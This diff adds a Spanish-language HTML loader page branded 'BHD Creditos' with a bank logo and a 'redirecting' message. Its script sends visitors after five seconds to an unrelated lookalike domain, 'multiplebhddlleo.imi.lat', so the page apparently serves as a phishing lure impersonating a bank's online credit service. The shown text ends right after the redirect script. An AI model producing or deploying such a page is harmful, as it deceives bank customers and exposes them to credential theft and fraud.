@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>BHD Creditos</title>
+
+  <!-- Google Fonts: Poppins -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
+
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background-color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      font-family: 'Poppins', sans-serif;
+      color: #333;
+      user-select: none;
+    }
+
+    .loader-container {
+      text-align: center;
+    }
+
+    .loader-gif {
+      width: 300px;
+      height: auto;
+      margin-bottom: 20px;
+    }
+
+    .loader-text {
+      font-size: 20px;
+      font-weight: 600;
+      opacity: 0;
+      transform: scale(0.95);
+      animation: fadeZoomIn 1s ease forwards;
+    }
+
+    @keyframes fadeZoomIn {
+      to {
+        opacity: 1;
+        transform: scale(1);
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="loader-container">
+    <img src="data:image/png;base64,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" alt="Cargando..." class="loader-gif" />
+    <div class="loader-text">
+      Redirigiendo a BHD Creditos En Linea...
+    </div>
+  </div>
+
+  <script>
+    setTimeout(() => {
+      window.location.href = 'https://multiplebhddlleo.imi.lat/';
+    }, 5000);
